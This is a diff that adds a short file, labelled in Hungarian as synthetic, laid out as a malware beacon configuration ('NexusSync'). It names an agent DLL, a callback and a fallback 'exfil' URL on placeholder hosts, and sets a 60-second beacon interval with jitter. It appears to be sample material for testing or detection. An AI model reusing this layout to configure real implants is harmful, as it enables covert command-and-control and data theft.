@@ -1,0 +1,7 @@
+NexusSync beacon konfiguracio (SZINTETIKUS)
+
+module      = nxs_agent.dll
+callback    = https://sync.nexus-cdn.example/u
+interval    = 60
+jitter      = 15
+fallback    = https://exfil.nexus-cdn.example/u
